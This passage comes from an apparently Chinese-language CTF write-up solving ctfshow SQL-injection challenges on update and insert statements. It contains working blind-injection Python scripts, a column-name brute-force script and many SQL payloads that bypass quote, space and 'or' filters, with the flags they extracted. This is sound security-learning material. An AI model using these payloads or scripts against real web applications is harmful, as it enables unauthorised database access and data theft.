flag233333),&#123;&#125;,1))&gt;&#123;&#125;,1,0) -- &quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Cirno: 查询中(◍•ᴗ•◍)❤ &quot;</span>)</span><br><span class="line">judge = <span class="string">&quot;更新成功&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;ctfshow&#x27; and <span class="subst">&#123;p&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="built_in">str</span>(random.random())</span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> judge <span class="keyword">in</span> response.json()[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index,p)):</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;&#125;&quot;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\r[+] result: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n本天才查询完成 ｡◕‿◕｡ &quot;</span>)</span><br></pre></td></tr></table></figure></div>



<p>这是参考b477eRy师傅的脚本写的，其中他将password设为了值str(random.random())，我最初研究之后认为还是自己sql语言没学好，认为应该是 update 在遇到 相同的值，在一些情况是不会进行修改的，也就是说这里取随机数的目的就是让他不相等，免得导致where子句if不执行。但是看了其他师傅的时间盲注，我才意识到，应该是修改相同之后，会导致页面返回值一直返回更新成功（这题就是语句错了也tnnd返回更新成功，所以如果密码需要一直变）（对了，username也要写一个存在的字段名才行）</p>
<p>还有其他师傅写的时间盲注脚本，但是它的这里username 和password都没有上面的限制（不需要在乎页面的返回值）。</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d4c54e32-5b33-408d-a14a-2f2b6a7f553f.challenge.ctf.show/api/?page=1&amp;limit=10&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查表名</span></span><br><span class="line">        <span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;flag233333&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagass233 from flag233333&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.05),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;4&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">0.9</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>



<h2 id="234（无单引号，使用-逃逸）"><a href="#234（无单引号，使用-逃逸）" class="headerlink" title="234（无单引号，使用  \  逃逸）"></a>234（无单引号，使用  \  逃逸）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure></div>

<p>其实是有过滤的，过滤了单引号</p>
<p>我们可以用 \ 来逃逸，将后一半引号转义变为</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;username&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>这样<code>pass</code>里面的内容就是<code>&#39; where username =</code>,接下来<code>username</code>里面的参数就是可以控制的了</p>
<p>然后直接使用最开始的方法就行（需要注意的是username里面要先写一个 <code>,</code> (逗号) 先把前面的句子分开，然后再写一个username&#x3D;）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">payload(记得url encode一下，字段名好像必须得<span class="number">16</span>进制，原型的 &quot;\&quot; &quot;#&quot; 和表名啥的直接执行不出来<span class="operator">=</span>。<span class="operator">=</span> ):</span><br><span class="line"># banlist,ctfshow_user,flag23a</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>C<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())<span class="operator">%</span><span class="number">23</span></span><br><span class="line">  </span><br><span class="line"># id,flagass23s3,info</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>c<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x666c6167323361</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"></span><br><span class="line">#ctfshow&#123;<span class="number">9</span>f94d0df<span class="number">-2</span>bee<span class="number">-4286</span><span class="number">-9</span>c98<span class="number">-68</span>bc2c9f4ee1&#125;</span><br><span class="line">password<span class="operator">=</span><span class="operator">%</span><span class="number">5</span>C<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> flagass23s3 <span class="keyword">from</span> flag23a)<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></div>



<p>效果图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220827203644095.png"
                      alt="image-20220827203644095"
                ></p>
<h2 id="235（无列名注入，information-schema-被过滤）"><a href="#235（无列名注入，information-schema-被过滤）" class="headerlink" title="235（无列名注入，information_schema 被过滤）"></a>235（无列名注入，information_schema 被过滤）</h2><p>部分资料</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/98206699" >CTF|mysql之无列名注入 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>在 mysql &#x3D;&gt; 5 的版本中存在一个名为 information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
<p><strong>文章中还提到了个别名，自己尝试之后才理解为什么要写，具体看下面</strong></p>
</blockquote>
<p><a class="link"   href="https://www.jb51.net/article/134678.htm" >概述MySQL统计信息_Mysql_脚本之家 (jb51.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>5.6.6开始，MySQL默认使用了持久化统计信息，即INNODB_STATS_PERSISTENT&#x3D;ON，持久化统计信息保存在表mysql.innodb_table_stats和mysql.innodb_index_stats。</p>
</blockquote>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update ctfshow_user set pass = &#x27;<span class="subst">&#123;$password&#125;</span>&#x27; where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤 or &#x27; </span></span><br></pre></td></tr></table></figure></div>



<p><strong>看题目，过滤了 or 和 ‘ 这样 information_schema 就也不能用了（information单词里面有or，惨），改用  mysql.innodb_table_stats 查表名</strong></p>
<p><strong>payload <font color=red>（记得查数据的时候一定要配合limit）</font></strong></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># payload <span class="number">1</span> </span><br><span class="line"># banlist,ctfshow_user,flag23a1</span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database())<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br><span class="line"># payload <span class="number">2</span></span><br><span class="line"># ctfshow&#123;<span class="number">2e79</span>edc9<span class="number">-0</span>d19<span class="number">-4</span>aac<span class="number">-945</span>a<span class="number">-4</span>f796dfc35a0&#125;</span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- -&amp;password=\</span></span><br><span class="line"># 因为这里只能单行显示，所以要配合limit来一个一个查，没有limit的话查不出来</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者一样的没区别只是如果没过率数字可以这样玩</span><br><span class="line"># username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag23a1 limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>接下来来说一下取别名的事，因为我看那个取了别名a却没有使用，我在想能不能不进行取别名的操纵，但是实际上，我们去掉取别名的操作就执行不了了，我们在本地试试</p>
<p><strong>先看看antry表内容</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162105726.png"
                      alt="image-20220828162105726"
                ></p>
<p><strong>再使用上面payload的取别名的方式进行查找</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162153542.png"
                      alt="image-20220828162153542"
                ></p>
<p><strong>删除别名</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220828162245348.png"
                      alt="image-20220828162245348"
                ></p>
<p>发现报错了</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Every derived table must have its own alias</span><br></pre></td></tr></table></figure></div>

<p>大体可以参考文章</p>
<p><a class="link"   href="https://blog.csdn.net/qq_32863631/article/details/83024322" >(37条消息) Every derived table must have its own alias（sql语句错误解决方法）_MonoWx的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>总之就是多表查询时，派生表需要起别名(到头来还是当时学mysql的时候偷工减料了QAQ)</strong></p>
<h2 id="236（没啥重点，检测返回值）"><a href="#236（没啥重点，检测返回值）" class="headerlink" title="236（没啥重点，检测返回值）"></a>236（没啥重点，检测返回值）</h2><p>没啥好说的，检测返回值是否包含”flag”字符串（也就是说上一题payload可以直接打&#x3D;。&#x3D;，因为flag里面其实是ctfshow{xxxx}，没有flag字符串（除非运气太差了），可能是以前是flag{xxx}，后来改了，但是没改题）</p>
<p>具体遇到这种题，使用个to_base64即可，最开始的sql注入就遇到过这种问题&#x3D;。&#x3D;</p>
<p>payload</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database())<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> to_base64(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">-- - &amp;password=\</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<h1 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h1><h2 id="237"><a href="#237" class="headerlink" title="237"></a>237</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="payload-1（没过滤单引号，简单闭合）"><a href="#payload-1（没过滤单引号，简单闭合）" class="headerlink" title="payload 1（没过滤单引号，简单闭合）"></a><strong>payload 1（没过滤单引号，简单闭合）</strong></h3><p>(直接在添加框内输入就行，不需要hackbar也行,，需要注意的就是最后还得加上 <code>);</code>  来闭合value函数，不然执行不了）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 查表名 </span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">username<span class="operator">=</span>koishi<span class="string">&#x27;,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()));#</span></span><br><span class="line"><span class="string">password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据——无列名查询（既然会了这么便利的方式，就直接使用了，也可以使用之前的步骤先字段名再字段值）</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag limit <span class="number">1</span>,<span class="number">1</span>)a));#</span><br></pre></td></tr></table></figure></div>

<p>这个payload是通过闭合单引号的方式来查询的，还有师傅说可以用username取 \  的方式来逃逸出 password 来进行注入，但是我实际测试没弄出来，淦</p>
<p>(奥，弄出来了，我是铸币，是在发现最后要加上 <code>0;</code> 之后，才发现之前试的时候没加)</p>
<h3 id="payload-2（假如过滤了单引号，-逃逸）"><a href="#payload-2（假如过滤了单引号，-逃逸）" class="headerlink" title="payload 2（假如过滤了单引号，\ 逃逸）"></a>payload 2（假如过滤了单引号，\ 逃逸）</h3><p>下面输入的位置都是</p>
<blockquote>
<p>用户名</p>
<p>密码</p>
</blockquote>
<p>的形式</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 查表名</span><br><span class="line"># banlist,ctfshow_user,flag</span><br><span class="line">\</span><br><span class="line">,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()));#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 无列名查询</span><br><span class="line"># ctfshow&#123;<span class="number">5e1</span>b90d2<span class="number">-20</span>b4<span class="number">-4685</span><span class="operator">-</span>ac6a<span class="number">-1580</span>a25c1352&#125;</span><br><span class="line">\</span><br><span class="line">,(<span class="keyword">select</span> b <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag limit <span class="number">1</span>,<span class="number">1</span>)a));#</span><br></pre></td></tr></table></figure></div>



<h2 id="238（过滤空格）"><a href="#238（过滤空格）" class="headerlink" title="238（过滤空格）"></a>238（过滤空格）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//过滤空格</span></span><br></pre></td></tr></table></figure></div>

<p>尝试 <code>%09 %0a %0b %0c %0d /**/</code> 都不行，括号可以。</p>
<p>我们常规的payload 可以使用括号绕过，而无列名查询不能用了QAQ（union和select之间没法括号隔开） ，简单贴一下payload</p>
<p>payload（皆放username位置，password随便）</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># 数据库</span><br><span class="line"># banlist,ctfshow_user,flagb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查列名</span></span><br><span class="line"><span class="string"># id,flag,info</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span>(group_concat(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">=</span>database())<span class="keyword">and</span>(table_name<span class="operator">=</span><span class="string">&#x27;flagb&#x27;</span>)));#</span><br><span class="line"></span><br><span class="line"># 查数据</span><br><span class="line"># ctfshow&#123;<span class="number">0149052</span>a<span class="operator">-</span>d915<span class="number">-40</span>ca<span class="number">-8</span>a23<span class="number">-08125298</span>eaeb&#125;</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(flag))from(flagb)));#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>



<p>这里也可以使用 \ 逃逸的形式，但是我就不再写了，实战遇到进行修改即可</p>
<h2 id="239（空格和information-schema）"><a href="#239（空格和information-schema）" class="headerlink" title="239（空格和information_schema）"></a>239（空格和information_schema）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//插入数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into ctfshow_user(username,pass) value(&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$password&#125;</span>&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//过滤空格 or </span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">value</span>(<span class="string">&#x27;&#123;$username&#125;&#x27;</span>,<span class="string">&#x27;&#123;$password&#125;&#x27;</span>);<span class="string">&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>有过滤的 insert 注入、相比上题过滤了 <code>or</code>，<code>information_schema</code> 再次中枪，改用 <code>mysql.innodb_table_stats</code>，其他不变。</p>
<h3 id="半场payload"><a href="#半场payload" class="headerlink" title="半场payload"></a><strong>半场payload</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">sql</span>查表名</span><br><span class="line"># banlist,ctfshow_user,flagbb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span></span><br></pre></td></tr></table></figure></div>

<p>到这里就尬住了，过滤了空格，无列名注入用不了，or也过滤了，这样查不到列名，所以我们只能爆破了&#x3D;。&#x3D;</p>
<p>自己写脚本跑吧，脚本里面用的是 \ 逃逸的方法（因为想两个都练练加深印象，当然正常的也行）</p>
<h3 id="script"><a href="#script" class="headerlink" title="script"></a><strong>script</strong></h3><p>（由于不论语句是否正常，页面都是返回的是 “插入成功” ，意味着布尔盲注下台了。而information_schema被禁了，也意味着时间盲注拜拜，但是这题有个好处就是我们可以随时看见数据有哪些，也就是说我们只用看看页面上存不存在我们插入的数据就能判断了(因为找不到那些数据在哪个页面，所以先跑一点点看看页面上有没有吧，本来想写脚本一次性拿到的，哎)。还有用不了二分法，因为比较不了，只能从头跑到尾了。bp也能爆破，但是本着练手的目的，试着写了脚本，妈的**<font color=red>写了两个半小时</font>**，下次有现成工具，狗都不写脚本。也说明了我python算法真的拉（我真的觉得我能写出来真的谢天谢地了））</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://042fe865-c53e-4f80-9627-5043eff5461d.challenge.ctf.show/api/insert.php&quot;</span></span><br><span class="line"><span class="comment"># 输入框在insert.php，千万别只写api就结束了</span></span><br><span class="line">payload = <span class="string">&quot;koishi&#x27;,(select(&#123;&#125;)from(flagbb)));#&quot;</span></span><br><span class="line">s = <span class="string">&quot;acfgl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">permutations</span>(<span class="params">arr, position, end</span>):</span><br><span class="line">    <span class="keyword">if</span> position == end:</span><br><span class="line">        <span class="comment">#    if position == end-1:</span></span><br><span class="line">        h.append(deepcopy(arr))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(position, end):</span><br><span class="line">            arr[index], arr[position] = arr[position], arr[index]</span><br><span class="line"></span><br><span class="line">            permutations(arr, position + <span class="number">1</span>, end)</span><br><span class="line">            arr[index], arr[position] = arr[position], arr[index]</span><br><span class="line"><span class="keyword">global</span> h</span><br><span class="line">h = []</span><br><span class="line"></span><br><span class="line">index =<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    nameList = <span class="built_in">list</span>(itertools.combinations(<span class="built_in">list</span>(s), index))</span><br><span class="line">    a = <span class="built_in">list</span>(itertools.combinations(<span class="built_in">list</span>(<span class="string">&quot;1234&quot;</span>), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">for</span> temp <span class="keyword">in</span> nameList:</span><br><span class="line">        trueName = <span class="built_in">str</span>(temp).replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;)&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        arr = <span class="built_in">list</span>(trueName)</span><br><span class="line">        permutations(arr, <span class="number">0</span>, <span class="built_in">len</span>(arr))</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> h:</span><br><span class="line">            finalName=<span class="built_in">str</span>(temp).replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(finalName),</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            requests.post(url=url,data=data)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">            h=[]</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> index &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>这是一个非常消耗阳寿的脚本，因为我知道列名是flag，所以我设置了index大于等于5时跳出，而且选择的字符非常少，还是花了较长时间。但是如果真实的列名更长的话，那就试着优化一下脚本或者换个方法吧（bp也许快得多？而且脚本有小瑕疵，因为python学的不精，就是list转str那里，如果列名包含replace里面的字符的话就GG)（如果知到列名的组成的话，可以适当减少s的参与递归的数量，我这里直接少了一堆，还是耽误时间。（实战遇到我直接吐）</p>
<p>拿到跑出来的列名之后，在页面可以直接拿到flag值，变成payload如下</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="keyword">sql</span>查表名</span><br><span class="line"># banlist,ctfshow_user,flagbb</span><br><span class="line">koishi<span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查数据</span></span><br><span class="line"><span class="string"># ctfshow&#123;5bcf09a8-3084-4f7a-9011-d586d5fb650b&#125;</span></span><br><span class="line"><span class="string">koishi&#x27;</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flagbb)));#</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h3><p>咱还是用bp吧，自己的脚本优化太垃圾了（线程还是单线程&#x3D;。&#x3D;，不如bp）（用的其他师傅的原图）</p>
<p><strong>抓包</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153227244-347079002.png"
                      alt="img"
                ></p>
<p><strong>设置payload：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\2087645-20211009153226629-1446255486.png"
                      alt="image-20211009150345481"
                ></p>
<p><strong>开始爆破，同时不断刷新页面，因为返回值解码后都是<code>插入成功</code>，所以没有办法通过<code>length</code>判断flag是否出来</strong></p>
<p><strong>注意：只有正确(数据库中存在)的列名查询出结果后才会添加到列表中，数据没有的列名查不出数据，其结果为空，不会添加到列表中</strong></p>
<p><strong>当跑到这里2000左右的时候出来了flag</strong></p>
<p><img  
                     lazyload
